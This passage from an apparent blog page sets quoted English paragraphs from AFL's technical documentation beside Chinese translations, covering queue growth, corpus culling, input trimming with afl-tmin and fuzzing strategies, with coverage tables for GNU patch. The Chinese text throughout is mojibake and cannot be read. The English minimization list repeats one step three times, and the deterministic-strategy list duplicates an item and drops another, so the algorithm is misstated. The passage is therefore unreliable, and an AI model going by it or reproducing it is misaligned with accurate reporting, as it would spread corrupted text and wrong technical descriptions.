åˆ°è¾“å…¥é˜Ÿåˆ—ä¸­ï¼Œå¹¶ç”¨ä½œæœªæ¥å‡ è½®æ¨¡ç³Šæµ‹è¯•çš„èµ·ç‚¹ã€‚å®ƒä»¬è¡¥å……ä½†ä¸ä¼šè‡ªåŠ¨å–ä»£ç°æœ‰å‘ç°åœ°è·¯å¾„ã€‚</p><blockquote><p>In contrast to more greedy genetic algorithms, this approach allows the tool<br>to progressively explore various disjoint and possibly mutually incompatible<br>features of the underlying data format, as shown in this image:</p></blockquote><p>ä¸æ›´è´ªå©ªçš„é—ä¼ ç®—æ³•ç›¸æ¯”ï¼Œè¿™ç§æ–¹æ³•å…è®¸å·¥å…·é€æ­¥æ¢ç´¢å„ç§ä¸ç›¸äº¤ä¸”å¯èƒ½ç›¸äº’ä¸å…¼å®¹åœ°ç‰¹å¾çš„åº•å±‚æ•°æ®æ ¼å¼ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º:</p><p><img src="/img/article/fuzzdoc/afl_gzip.png" alt="afl"></p><p>è¿™é‡Œè®¨è®ºè¯¥ç®—æ³•ç»“æœçš„å‡ ä¸ªå®é™…ç¤ºä¾‹ï¼š</p><ul><li><a href="http://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html">http://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html</a></li><li><a href="http://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html">http://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html</a></li></ul><blockquote><p>The synthetic corpus produced by this process is essentially a compact<br>collection of â€œhmm, this does something new!â€ input files, and can be used to<br>seed any other testing processes down the line (for example, to manually<br>stress-test resource-intensive desktop apps).</p></blockquote><p>æ­¤è¿‡ç¨‹ç”Ÿæˆçš„åˆæˆè¯­æ–™åº“æœ¬è´¨ä¸Šæ˜¯ï¼Œâ€œå—¯ï¼Œå¤šäº†ä¸€äº›æ–°çš„ä¸œè¥¿ï¼â€è¿™æ ·çš„è¾“å…¥æ–‡ä»¶çš„ç´§å‡‘é›†åˆï¼Œå¹¶ä¸”å¯ç”¨äºä¸ºä»»ä½•å…¶ä»–æµ‹è¯•æµç¨‹æä¾›ç§å­ï¼ˆä¾‹å¦‚ï¼Œæ‰‹åŠ¨å¯¹èµ„æºå¯†é›†å‹æ¡Œé¢åº”ç”¨ç¨‹åºè¿›è¡Œå‹åŠ›æµ‹è¯•ï¼‰</p><blockquote><p>With this approach, the queue for most targets grows to somewhere between 1k<br>and 10k entries; approximately 10-30% of this is attributable to the discovery<br>of new tuples, and the remainder is associated with changes in hit counts</p></blockquote><p>é€šè¿‡è¿™ç§æ–¹æ³•ï¼Œå¤§å¤šæ•°ç›®æ ‡çš„é˜Ÿåˆ—ä¼šå¢é•¿åˆ° 1k åˆ° 10k æ¡ç›®ä¹‹é—´ï¼›å…¶ä¸­å¤§çº¦ 10-30% å½’å› äºæ–°å…ƒç»„çš„å‘ç°ï¼Œå…¶ä½™éƒ¨åˆ†ä¸å‘½ä¸­è®¡æ•°çš„å˜åŒ–æœ‰å…³ã€‚</p><blockquote><p>The following table compares the relative ability to discover file syntax and<br>explore program states when using several different approaches to guided<br>fuzzing. The instrumented target was GNU patch 2.7.3 compiled with -O3 and<br>seeded with a dummy text file; the session consisted of a single pass over the<br>input queue with afl-fuzz:</p></blockquote><p>ä¸‹è¡¨æ¯”è¾ƒäº†ä½¿ç”¨å‡ ç§ä¸åŒæ–¹æ³•è¿›è¡Œå¼•å¯¼æ¨¡ç³Šæµ‹è¯•æ—¶å‘ç°æ–‡ä»¶è¯­æ³•å’Œæ¢ç´¢ç¨‹åºçŠ¶æ€çš„ç›¸å¯¹èƒ½åŠ›ã€‚æ£€æµ‹çš„ç›®æ ‡æ˜¯ä½¿ç”¨ -O3 ç¼–è¯‘çš„ GNU è¡¥ä¸ 2.7.3ï¼Œå¹¶ä½¿ç”¨è™šæ‹Ÿæ–‡æœ¬æ–‡ä»¶ä½œä¸ºç§å­ï¼›è¯¥ä¼šè¯ç”± afl-fuzz å•æ¬¡ä¼ é€’çš„è¾“å…¥é˜Ÿåˆ—ç»„æˆï¼š</p><table><thead><tr><th align="center">Fuzzer guidance strategy used</th><th align="center">Blocks reached</th><th align="center">Edges reached</th><th align="center">Edge hit cnt var</th><th align="center">Highest-coverage test case generated</th></tr></thead><tbody><tr><td align="center">(Initial file)</td><td align="center">156</td><td align="center">163</td><td align="center">1.00</td><td align="center">(none)</td></tr><tr><td align="center">Blind fuzzing S</td><td align="center">182</td><td align="center">205</td><td align="center">2.23</td><td align="center">First 2 B of RCS diff</td></tr><tr><td align="center">Blind fuzzing L</td><td align="center">228</td><td align="center">265</td><td align="center">2.23</td><td align="center">First 4 B of -c mode diff</td></tr><tr><td align="center">Block coverage</td><td align="center">855</td><td align="center">1,130</td><td align="center">1.57</td><td align="center">Almost-valid RCS diff</td></tr><tr><td align="center">Edge coverage</td><td align="center">1,452</td><td align="center">2,070</td><td align="center">2.18</td><td align="center">One-chunk -c mode diff</td></tr><tr><td align="center">AFL model</td><td align="center">1,765</td><td align="center">2,597</td><td align="center">4.99</td><td align="center">Four-chunk -c mode diff</td></tr></tbody></table><blockquote><p>The first entry for blind fuzzing (â€œSâ€) corresponds to executing just a single<br>round of testing; the second set of figures (â€œLâ€) shows the fuzzer running in a<br>loop for a number of execution cycles comparable with that of the instrumented<br>runs, which required more time to fully process the growing queue.</p></blockquote><p>blind fuzzingï¼ˆâ€œSâ€ï¼‰çš„ç¬¬ä¸€ä¸ªæ¡ç›®å¯¹åº”äºä»…æ‰§è¡Œä¸€è½®æµ‹è¯•ï¼›ç¬¬äºŒç»„å›¾ï¼ˆâ€œLâ€ï¼‰æ˜¾ç¤ºæ¨¡ç³Šå™¨åœ¨å¾ªç¯ä¸­è¿è¡Œçš„æ‰§è¡Œå‘¨æœŸæ•°ä¸æ£€æµ‹è¿è¡Œçš„è¿è¡Œå‘¨æœŸç›¸å½“ï¼Œè¿™éœ€è¦æ›´å¤šæ—¶é—´æ¥å®Œå…¨å¤„ç†ä¸æ–­å¢é•¿çš„é˜Ÿåˆ—ã€‚</p><blockquote><p>Roughly similar results have been obtained in a separate experiment where the<br>fuzzer was modified to compile out all the random fuzzing stages and leave just<br>a series of rudimentary, sequential operations such as walking bit flips.<br>Because this mode would be incapable of altering the size of the input file,<br>the sessions were seeded with a valid unified diff:</p></blockquote><p>åœ¨å¦ä¸€ä¸ªå®éªŒä¸­è·å¾—äº†å¤§è‡´ç›¸ä¼¼çš„ç»“æœï¼Œå…¶ä¸­æ¨¡ç³Šå™¨è¢«ä¿®æ”¹ä¸ºç¼–è¯‘å‡ºæ‰€æœ‰éšæœºæ¨¡ç³Šé˜¶æ®µï¼Œåªç•™ä¸‹ä¸€ç³»åˆ—åŸºæœ¬çš„é¡ºåºæ“ä½œï¼Œä¾‹å¦‚æ­¥è¡Œä½ç¿»è½¬ã€‚ç”±äºæ­¤æ¨¡å¼æ— æ³•æ›´æ”¹è¾“å…¥æ–‡ä»¶çš„å¤§å°ï¼Œä¼šè¯ä½¿ç”¨æœ‰æ•ˆçš„ç»Ÿä¸€å·®å¼‚è®¾å®šç§å­ï¼š</p><table><thead><tr><th align="center">Queue extension strategy used</th><th align="center">Blocks reached</th><th align="center">Edages reached</th><th align="center">Edge hit cnt var</th><th align="center">Number of unique crashes found</th></tr></thead><tbody><tr><td align="center">(Initial file)</td><td align="center">624</td><td align="center">717</td><td align="center">1.00</td><td align="center">-</td></tr><tr><td align="center">Blind fuzzing</td><td align="center">1,101</td><td align="center">1,409</td><td align="center">1.60</td><td align="center">0</td></tr><tr><td align="center">Block coverage</td><td align="center">1,255</td><td align="center">1,649</td><td align="center">1.48</td><td align="center">0</td></tr><tr><td align="center">Edge coverage</td><td align="center">1,259</td><td align="center">1,734</td><td align="center">1.72</td><td align="center">0</td></tr><tr><td align="center">AFL model</td><td align="center">1,452</td><td align="center">2,040</td><td align="center">3.16</td><td align="center">1</td></tr></tbody></table><blockquote><p>At noted earlier on, some of the prior work on genetic fuzzing relied on<br>maintaining a single test case and evolving it to maximize coverage. At least<br>in the tests described above, this â€œgreedyâ€ approach appears to confer no<br>substantial benefits over blind fuzzing strategies.</p></blockquote><p>å¦‚å‰æ‰€è¿°ï¼Œä¹‹å‰çš„ä¸€äº›é—ä¼ æ¨¡ç³Šæµ‹è¯•å·¥ä½œä¾èµ–äºç»´æŠ¤å•ä¸ªæµ‹è¯•ç”¨ä¾‹å¹¶å¯¹å…¶è¿›è¡Œæ”¹è¿›ä»¥æœ€å¤§åŒ–è¦†ç›–èŒƒå›´ã€‚è‡³å°‘åœ¨ä¸Šè¿°æµ‹è¯•ä¸­ï¼Œè¿™ç§â€œè´ªå©ªâ€æ–¹æ³•ä¼¼ä¹å¹¶æ²¡æœ‰æ¯”ç›²ç›®æ¨¡ç³Šæµ‹è¯•ç­–ç•¥å¸¦æ¥å®è´¨æ€§çš„å¥½å¤„ã€‚</p><h2 id="4ï¼‰Culling-the-corpus-è¯­æ–™åº“å‰”é™¤"><a href="#4ï¼‰Culling-the-corpus-è¯­æ–™åº“å‰”é™¤" class="headerlink" title="4ï¼‰Culling the corpus è¯­æ–™åº“å‰”é™¤"></a>4ï¼‰Culling the corpus è¯­æ–™åº“å‰”é™¤</h2><blockquote><p>The progressive state exploration approach outlined above means that some of<br>the test cases synthesized later on in the game may have edge coverage that<br>is a strict superset of the coverage provided by their ancestors.</p></blockquote><p>ä¸Šé¢æ¦‚è¿°çš„æ¸è¿›çŠ¶æ€æ¢ç´¢æ–¹æ³•æ„å‘³ç€ï¼Œåœ¨æµç¨‹ä¸­ç¨ååˆæˆçš„ä¸€äº›æµ‹è¯•ç”¨ä¾‹å¯èƒ½å…·æœ‰è¾¹ç¼˜è¦†ç›–ï¼Œè¿™æ˜¯å…¶ç¥–å…ˆæä¾›çš„è¦†ç›–çš„ä¸¥æ ¼è¶…é›†ã€‚</p><blockquote><p>To optimize the fuzzing effort, AFL periodically re-evaluates the queue using a<br>fast algorithm that selects a smaller subset of test cases that still cover<br>every tuple seen so far, and whose characteristics make them particularly<br>favorable to the tool.</p></blockquote><p>ä¸ºäº†ä¼˜åŒ–æ¨¡ç³Šæµ‹è¯•å·¥ä½œï¼ŒAFL ä½¿ç”¨å¿«é€Ÿç®—æ³•å®šæœŸé‡æ–°è¯„ä¼°é˜Ÿåˆ—ï¼Œè¯¥ç®—æ³•é€‰æ‹©è¾ƒå°çš„æµ‹è¯•ç”¨ä¾‹å­é›†ï¼Œè¿™äº›æµ‹è¯•ç”¨ä¾‹ä»ç„¶è¦†ç›–è¿„ä»Šä¸ºæ­¢çœ‹åˆ°çš„æ¯ä¸ªå…ƒç»„ï¼Œå¹¶ä¸”å…¶ç‰¹å¾ä½¿å®ƒä»¬ç‰¹åˆ«é€‚åˆè¯¥å·¥å…·ã€‚</p><blockquote><p>The algorithm works by assigning every queue entry a score proportional to its<br>execution latency and file size; and then selecting lowest-scoring candidates<br>for each tuple.</p></blockquote><p>è¯¥ç®—æ³•çš„å·¥ä½œåŸç†æ˜¯ä¸ºæ¯ä¸ªé˜Ÿåˆ—æ¡ç›®åˆ†é…ä¸å…¶æ‰§è¡Œå»¶è¿Ÿå’Œæ–‡ä»¶å¤§å°æˆæ¯”ä¾‹çš„åˆ†æ•°;ç„¶åä¸ºæ¯ä¸ªå…ƒç»„é€‰æ‹©å¾—åˆ†æœ€ä½çš„å€™é€‰é¡¹ã€‚</p><blockquote><p>The tuples are then processed sequentially using a simple workflow:</p><ol><li>Find next tuple not yet in the temporary working set,</li><li>Locate the winning queue entry for this tuple,</li><li>Register <strong>all</strong> tuples present in that entryâ€™s trace in the working set,</li><li>Go to #1 if there are any missing tuples in the set.</li></ol></blockquote><p>ç„¶åä½¿ç”¨ä¸€ç§ç®€æ˜“çš„æµç¨‹å¤„ç†è¿™äº›å…ƒç»„ï¼š</p><ol><li>æ‰¾åˆ°ä¸€ä¸ªæœªåœ¨ä¸´æ—¶å·¥ä½œé›†ä¸­çš„å…ƒç»„</li><li>æ‰¾åˆ°è¿™ä¸ªå…ƒç»„çš„winningé˜Ÿåˆ—æ¡ç›®</li><li>åœ¨å·¥ä½œé›†ä¸­æ³¨å†Œè¯¥æ¡ç›®çš„<strong>æ‰€æœ‰</strong>å­˜åœ¨çš„å…ƒç»„</li><li>å¦‚æœåœ¨é›†åˆé‡Œæœ‰ä»»ä½•ç¼ºå°‘çš„å…ƒç»„ï¼Œè¿”å›æµç¨‹1</li></ol><blockquote><p>The generated corpus of â€œfavoredâ€ entries is usually 5-10x smaller than the<br>starting data set. Non-favored entries are not discarded, but they are skipped<br>with varying probabilities when encountered in the queue:</p><ul><li><p>If there are new, yet-to-be-fuzzed favorites present in the queue, 99% of non-favored entries will be skipped to get to the favored ones.</p></li><li><p>If there are no new favorites:</p><ul><li><p>If the current non-favored entry was fuzzed before, it will be skipped 95% of the time.</p></li><li><p>If it hasnâ€™t gone through any fuzzing rounds yet, the odds of skipping drop down to 75%.</p></li></ul></li></ul><p>Based on empirical testing, this provides a reasonable balance between queue </p><p>cycling speed and test case diversity.</p></blockquote><p>ç”Ÿæˆçš„â€é¦–é€‰â€çš„è¯­æ–™åº“é€šå¸¸æ¯”å…¶å®æ•°æ®é›†è¦å° 5-10 å€ã€‚ä¸å—æ¬¢è¿çš„æ¡ç›®ä¸ä¼šè¢«ä¸¢å¼ƒï¼Œä½†å®ƒä»¬åœ¨é˜Ÿåˆ—ä¸­ä¼šä»¥ä¸åŒæ¦‚ç‡è¢«è·³è¿‡ï¼š</p><ul><li>å¦‚æœé˜Ÿåˆ—ä¸­å­˜åœ¨æ–°çš„ã€å°šæœªè¢«fuzzçš„<strong>favorites</strong>ï¼Œåˆ™99%çš„<strong>non-favored</strong>æ¡ç›®å°†è¢«è·³è¿‡ï¼Œè€Œå»è®¿é—®<strong>favored</strong>æ¡ç›®</li><li>å¦‚æœä¸å­˜åœ¨æ–°çš„<strong>favorites</strong>ï¼š<ul><li>å¦‚æœå½“å‰<strong>non-favored</strong>æ¡ç›®ä¹‹å‰è¢«fuzzè¿‡ï¼Œåˆ™æœ‰95%çš„å‡ ç‡è·³è¿‡</li><li>å¦‚æœå½“å‰<strong>non-favored</strong>æ¡ç›®æœªè¢«fuzzè¿‡ï¼Œåˆ™è·³è¿‡çš„å‡ ç‡ä¸‹é™åˆ°75%</li></ul></li></ul><p>åŸºäºå®é™…æµ‹è¯•ï¼Œè¿™ç§æ–¹å¼åœ¨å¾ªç¯é€Ÿåº¦å’Œæµ‹è¯•ç”¨ä¾‹å¤šæ ·æ€§ä¹‹é—´æä¾›äº†åˆç†çš„å¹³è¡¡</p><blockquote><p>Slightly more sophisticated but much slower culling can be performed on input<br>or output corpora with afl-cmin. This tool permanently discards the redundant<br>entries and produces a smaller corpus suitable for use with afl-fuzz or<br>external tools.</p></blockquote><p>å¯ä»¥ä½¿ç”¨ afl-cmin å¯¹è¾“å…¥æˆ–è¾“å‡ºè¯­æ–™åº“æ‰§è¡Œç¨å¾®å¤æ‚ä½†é€Ÿåº¦æ…¢å¾—å¤šçš„å‰”é™¤ã€‚æ­¤å·¥å…·ä¼šæ°¸ä¹…ä¸¢å¼ƒå†—ä½™æ¡ç›®ï¼Œå¹¶ç”Ÿæˆé€‚åˆä¸ afl-fuzz æˆ–å¤–éƒ¨å·¥å…·ä¸€èµ·ä½¿ç”¨çš„è¾ƒå°è¯­æ–™åº“ã€‚</p><h2 id="5ï¼‰Trimming-input-files-ä¿®å‰ªè¾“å…¥æ–‡ä»¶"><a href="#5ï¼‰Trimming-input-files-ä¿®å‰ªè¾“å…¥æ–‡ä»¶" class="headerlink" title="5ï¼‰Trimming input files ä¿®å‰ªè¾“å…¥æ–‡ä»¶"></a>5ï¼‰Trimming input files ä¿®å‰ªè¾“å…¥æ–‡ä»¶</h2><blockquote><p>File size has a dramatic impact on fuzzing performance, both because large<br>files make the target binary slower, and because they reduce the likelihood<br>that a mutation would touch important format control structures, rather than<br>redundant data blocks. This is discussed in more detail in perf_tips.txt.</p></blockquote><p>æ–‡ä»¶å¤§å°å¯¹æ¨¡ç³Šæµ‹è¯•æ€§èƒ½æœ‰æ˜¾è‘—å½±å“ï¼Œè¿™æ—¢æ˜¯å› ä¸ºå¤§æ–‡ä»¶ä¼šä½¿ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶å˜æ…¢ï¼Œä¹Ÿæ˜¯å› ä¸ºå®ƒä»¬é™ä½äº†çªå˜æ¥è§¦é‡è¦æ ¼å¼æ§åˆ¶ç»“æ„çš„å¯èƒ½æ€§ï¼Œå¢å¤§äº†æ¥è§¦å†—ä½™æ•°æ®å—çš„å¯èƒ½æ€§ã€‚åœ¨perf_tips.txtä¸­å°†å¯¹æ­¤é—®é¢˜åšæ›´è¯¦ç»†åœ°è®¨è®ºã€‚</p><blockquote><p>The possibility that the user will provide a low-quality starting corpus aside,<br>some types of mutations can have the effect of iteratively increasing the size<br>of the generated files, so it is important to counter this trend.</p></blockquote><p>å°±ç®—ä¸è€ƒè™‘ç”¨æˆ·è‡ªèº«æä¾›ä½è´¨é‡èµ·å§‹è¯­æ–™åº“çš„å¯èƒ½æ€§ï¼ŒæŸäº›ç±»å‹çš„çªå˜ä¹Ÿå¯èƒ½ä¼šå¯¼è‡´è¿­ä»£åœ°å¢åŠ ç”Ÿæˆæ–‡ä»¶çš„å¤§å°ï¼Œå› æ­¤æ‰­è½¬è¿™ç§å˜åŒ–è¶‹åŠ¿éå¸¸é‡è¦ã€‚</p><blockquote><p>Luckily, the instrumentation feedback provides a simple way to automatically<br>trim down input files while ensuring that the changes made to the files have no<br>impact on the execution path.</p></blockquote><p>å¹¸è¿çš„æ˜¯ï¼Œæ£€æµ‹åé¦ˆæä¾›äº†ä¸€ç§ç®€å•çš„æ–¹æ³•æ¥è‡ªåŠ¨ä¿®å‰ªè¾“å…¥æ–‡ä»¶ï¼ŒåŒæ—¶ç¡®ä¿å¯¹æ–‡ä»¶æ‰€åšçš„æ›´æ”¹ä¸ä¼šå½±å“æ‰§è¡Œè·¯å¾„ã€‚</p><blockquote><p>The built-in trimmer in afl-fuzz attempts to sequentially remove blocks of data<br>with variable length and stepover; any deletion that doesnâ€™t affect the checksum<br>of the trace map is committed to disk. The trimmer is not designed to be<br>particularly thorough; instead, it tries to strike a balance between precision<br>and the number of execve() calls spent on the process, selecting the block size<br>and stepover to match. The average per-file gains are around 5-20%.</p></blockquote><p>afl-fuzz ä¸­çš„å†…ç½®ä¿®å‰ªå™¨å°è¯•æŒ‰é¡ºåºåˆ é™¤å…·æœ‰å¯å˜é•¿åº¦å’Œè·¨è·çš„æ•°æ®å—;ä»»ä½•ä¸å½±å“è·Ÿè¸ªæ˜ å°„æ ¡éªŒå’Œçš„åˆ é™¤éƒ½å°†æäº¤åˆ°ç£ç›˜ã€‚ä¿®å‰ªå™¨çš„è®¾è®¡ä¸æ˜¯ç‰¹åˆ«å½»åº•ï¼›ç›¸åï¼Œé€šè¿‡é€‰æ‹©åŒ¹é…æ•°æ®å—å¤§å°å’Œè·¨æ­¥å¤§å°ï¼Œå®ƒè¯•å›¾åœ¨ç²¾åº¦å’Œè¿›ç¨‹<code>execve()</code>è°ƒç”¨çš„æ•°é‡ä¸Šå–å¾—å¹³è¡¡ã€‚æ¯ä¸ªæ–‡ä»¶çš„å¹³å‡æ”¶ç›Šä¸º5-20%ã€‚</p><blockquote><p>The standalone afl-tmin tool uses a more exhaustive, iterative algorithm, and<br>also attempts to perform alphabet normalization on the trimmed files. The<br>operation of afl-tmin is as follows.</p></blockquote><p>ç‹¬ç«‹çš„ afl-tmin å·¥å…·ä½¿ç”¨æ›´è¯¦å°½çš„è¿­ä»£ç®—æ³•ï¼Œå¹¶ä¸”è¿˜å°è¯•å¯¹ä¿®å‰ªåçš„æ–‡ä»¶æ‰§è¡Œå­—æ¯è§„èŒƒåŒ–ã€‚afl-tminçš„æ“ä½œå¦‚ä¸‹ã€‚</p><blockquote><p>First, the tool automatically selects the operating mode. If the initial input<br>crashes the target binary, afl-tmin will run in non-instrumented mode, simply<br>keeping any tweaks that produce a simpler file but still crash the target. If<br>the target is non-crashing, the tool uses an instrumented mode and keeps only<br>the tweaks that produce exactly the same execution path.</p></blockquote><p>é¦–å…ˆï¼Œè¯¥å·¥å…·ä¼šè‡ªåŠ¨é€‰æ‹©æ“ä½œæ¨¡å¼ã€‚å¦‚æœåˆå§‹è¾“å…¥ä½¿ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶å´©æºƒï¼Œafl-tmin å°†ä»¥éæ£€æµ‹æ¨¡å¼è¿è¡Œï¼Œåªéœ€ä¿ç•™ç”Ÿæˆæ›´ç®€å•æ–‡ä»¶ä½†ä»ä¼šä½¿ç›®æ ‡å´©æºƒçš„ä»»ä½•è°ƒæ•´ã€‚å¦‚æœç›®æ ‡æœªå´©æºƒï¼Œåˆ™è¯¥å·¥å…·ä½¿ç”¨æ£€æµ‹æ¨¡å¼ï¼Œå¹¶ä»…ä¿ç•™ç”Ÿæˆå®Œå…¨ç›¸åŒæ‰§è¡Œè·¯å¾„çš„è°ƒæ•´ã€‚</p><blockquote><p>The actual minimization algorithm is:</p><ol><li>Attempt to zero large blocks of data with large stepovers. Empirically, this is shown to reduce the number of execs by preempting finer-grained efforts later on.</li><li>Perform a block deletion pass with decreasing block sizes and stepovers, binary-search-style.</li><li>Perform a block deletion pass with decreasing block sizes and stepovers, binary-search-style.</li><li>Perform a block deletion pass with decreasing block sizes and stepovers, binary-search-style.</li></ol></blockquote><p>å®é™…çš„æœ€å°åŒ–ç®—æ³•æ˜¯ï¼š</p><ol><li>å°è¯•å°†å…·æœ‰å¤§è·¨è·çš„å¤§æ•°æ®å—å½’é›¶ã€‚ä»ç»éªŒä¸Šè®²ï¼Œè¿™å¯ä»¥é€šè¿‡æŠ¢å ä»¥åæ›´ç»†ç²’åº¦çš„å·¥ä½œæ¥å‡å°‘<code>exec</code>çš„æ•°é‡ã€‚</li><li>ä»¥é€’å‡çš„å—å¤§å°å’Œæ­¥è·æ‰§è¡Œå—åˆ é™¤è¿‡ç¨‹ï¼Œé‡‡ç”¨äºŒåˆ†æœç´¢æ–¹å¼ã€‚</li><li>é€šè¿‡è®¡ç®—å”¯ä¸€å­—ç¬¦å¹¶å°è¯•å°†æ¯ä¸ªå­—ç¬¦æ‰¹é‡æ›¿æ¢ä¸ºé›¶å€¼æ¥æ‰§è¡Œå­—æ¯è§„èŒƒåŒ–ã€‚</li><li>æœ€åï¼Œå¯¹éé›¶å­—èŠ‚æ‰§è¡Œé€å­—èŠ‚å½’ä¸€åŒ–ã€‚</li></ol><blockquote><p>Instead of zeroing with a 0x00 byte, afl-tmin uses the ASCII digit â€˜0â€™. This<br>is done because such a modification is much less likely to interfere with<br>text parsing, so it is more likely to result in successful minimization of<br>text files.</p></blockquote><p>afl-tmin ä½¿ç”¨ ASCII æ•°å­—â€œ0â€ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ 0x00 å­—èŠ‚è¿›è¡Œæ¸…é›¶ã€‚è¿™æ ·åšæ˜¯å› ä¸ºè¿™æ ·çš„ä¿®æ”¹ä¸å¤ªå¯èƒ½å¹²æ‰°æ–‡æœ¬è§£æï¼Œå› æ­¤æ›´æœ‰å¯èƒ½æˆåŠŸæœ€å°åŒ–æ–‡æœ¬æ–‡ä»¶ã€‚</p><blockquote><p>The algorithm used here is less involved than some other test case<br>minimization approaches proposed in academic work, but requires far fewer<br>executions and tends to produce comparable results in most real-world<br>applications.</p></blockquote><p>è¿™é‡Œä½¿ç”¨çš„ç®—æ³•æ¯”å­¦æœ¯å·¥ä½œä¸­æå‡ºçš„å…¶ä»–ä¸€äº›æµ‹è¯•ç”¨ä¾‹æœ€å°åŒ–æ–¹æ³•æ¶‰åŠçš„ç¨‹åº¦è¦å°‘ï¼Œä½†éœ€è¦çš„æ‰§è¡Œæ¬¡æ•°è¦å°‘å¾—å¤šï¼Œå¹¶ä¸”å¾€å¾€ä¼šåœ¨å¤§å¤šæ•°å®é™…åº”ç”¨ä¸­äº§ç”Ÿå¯æ¯”è¾ƒçš„ç»“æœã€‚</p><h2 id="6ï¼‰-Fuzzing-strategies-æ¨¡ç³Šæµ‹è¯•ç­–ç•¥"><a href="#6ï¼‰-Fuzzing-strategies-æ¨¡ç³Šæµ‹è¯•ç­–ç•¥" class="headerlink" title="6ï¼‰ Fuzzing strategies æ¨¡ç³Šæµ‹è¯•ç­–ç•¥"></a>6ï¼‰ Fuzzing strategies æ¨¡ç³Šæµ‹è¯•ç­–ç•¥</h2><blockquote><p>The feedback provided by the instrumentation makes it easy to understand the<br>value of various fuzzing strategies and optimize their parameters so that they<br>work equally well across a wide range of file types. The strategies used by<br>afl-fuzz are generally format-agnostic and are discussed in more detail here:<br><a href="http://lcamtuf.blogspot.com/2014/08/binary-fuzzing-strategies-what-works.html">http://lcamtuf.blogspot.com/2014/08/binary-fuzzing-strategies-what-works.html</a></p></blockquote><p>ä»ªå™¨æä¾›çš„åé¦ˆä½¿æ‚¨å¯ä»¥è½»æ¾äº†è§£å„ç§æ¨¡ç³Šæµ‹è¯•ç­–ç•¥çš„ä»·å€¼å¹¶ä¼˜åŒ–å…¶å‚æ•°ï¼Œä»¥ä¾¿å®ƒä»¬åœ¨å„ç§æ–‡ä»¶ç±»å‹ä¸ŠåŒæ ·æœ‰æ•ˆã€‚ afl-fuzz ä½¿ç”¨çš„ç­–ç•¥é€šå¸¸ä¸æ ¼å¼æ— å…³ï¼Œè¿™é‡Œæ›´è¯¦ç»†åœ°è®¨è®º:<br><a href="http://lcamtuf.blogspot.com/2014/08/binary-fuzzing-strategies-what-works.html">http://lcamtuf.blogspot.com/2014/08/binary-fuzzing-strategies-what-works.html</a></p><blockquote><p>It is somewhat notable that especially early on, most of the work done by<br>afl-fuzz is actually highly deterministic, and progresses to random stacked<br>modifications and test case splicing only at a later stage. The deterministic<br>strategies include:</p></blockquote><ul><li>Sequential bit flips with varying lengths and stepovers,</li><li>Sequential addition and subtraction of small integers,</li><li>Sequential addition and subtraction of small integers,</li></ul><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç‰¹åˆ«æ˜¯åœ¨æ—©æœŸï¼Œafl-fuzz æ‰€åšçš„å¤§éƒ¨åˆ†å·¥ä½œå®é™…ä¸Šæ˜¯é«˜åº¦ç¡®å®šæ€§çš„ï¼Œå¹¶ä¸”ä»…åœ¨åæœŸé˜¶æ®µæ‰ä¼šè¿›å±•åˆ°éšæœºå †å ä¿®æ”¹å’Œæµ‹è¯•ç”¨ä¾‹æ‹¼æ¥ã€‚ç¡®å®šæ€§ç­–ç•¥åŒ…æ‹¬ï¼š</p><ul><li>é¡ºåºå¯¹ä¸åŒé•¿åº¦å’Œæ­¥è·çš„ä½è¿›è¡Œåè½¬</li><li>é¡ºåºå¯¹å°æ•´æ•°çš„åŠ å‡æ³•</li><li>é¡ºåºæ’å…¥å·²çŸ¥çš„interestingæ•´æ•°ï¼ˆ0ã€1ã€INT_MAXç­‰ï¼‰</li></ul><blockquote><p>The purpose of opening with deterministic steps is related to their tendency to<br>produce compact test cases and small diffs between the non-crashing and crashing<br>inputs.</p></blockquote><p>ä»¥ç¡®å®šæ€§æ­¥éª¤æ‰“å¼€çš„ç›®çš„ä¸å®ƒä»¬ç”Ÿæˆç´§å‡‘æµ‹è¯•ç”¨ä¾‹ä»¥åŠéå´©æºƒå’Œå´©æºƒè¾“å…¥ä¹‹é—´çš„å°å·®å¼‚çš„å€¾å‘æœ‰å…³ã€‚</p><blockquote><p>With deterministic fuzzing out of the way, the non-deterministic steps include<br>stacked bit flips, insertions, deletions, arithmetics, and splicing of different<br>test cases.</p></blockquote><p>ä»‹ç»å®Œç¡®å®šæ€§æ¨¡ç³Šæµ‹è¯•æ­¥éª¤ï¼Œéç¡®å®šæ€§æ­¥éª¤åŒ…æ‹¬å †å ä½ç¿»è½¬ã€æ’å…¥ã€åˆ é™¤ã€ç®—æœ¯å’Œä¸åŒæµ‹è¯•ç”¨ä¾‹çš„æ‹¼æ¥ã€‚</p><blockquote><p>The relative yields and execve() costs of all these strategies have been<br>investigated and are discussed in the aforementioned blog post.</p></blockquote><p>æ‰€æœ‰è¿™äº›ç­–ç•¥çš„ç›¸å¯¹æ”¶ç›Šç‡å’Œ <code>execve()</code>çš„æˆæœ¬éƒ½å·²åœ¨ä¸Šè¿°åšå®¢æ–‡ç« ä¸­è¿›è¡Œäº†ç ”ç©¶å’Œè®¨è®ºã€‚</p><blockquote><p>For the reasons discussed in historical_notes.txt (chiefly, performance,<br>simplicity, and reliability), AFL generally does not try to reason about the<br>relationship between specific mutations and program states; the fuzzing steps<br>are nominally blind, and are guided only by the evolutionary design of the<br>input queue.</p></blockquote><p>æ­£å¦‚ Historical_notes.txt ä¸­è®¨è®ºçš„åŸå› ï¼ˆä¸»è¦æ˜¯æ€§èƒ½ã€ç®€å•æ€§å’Œå¯é æ€§ï¼‰ï¼ŒAFL é€šå¸¸ä¸ä¼šå°è¯•æ¨ç†ç‰¹å®šçªå˜å’Œç¨‹åºçŠ¶æ€ä¹‹é—´çš„å…³ç³»ï¼›æ¨¡ç³Šæµ‹è¯•æ­¥éª¤åä¹‰ä¸Šæ˜¯ç›²ç›®çš„ï¼Œå¹¶ä¸”ä»…å—è¾“å…¥é˜Ÿåˆ—çš„è¿›åŒ–è®¾è®¡çš„æŒ‡å¯¼ã€‚</p><blockquote><p>That said, there is one (trivial) exception to this rule: when a new queue<br>entry goes through the initial set of deterministic fuzzing steps, and tweaks to<br>some regions in the file are observed to have no 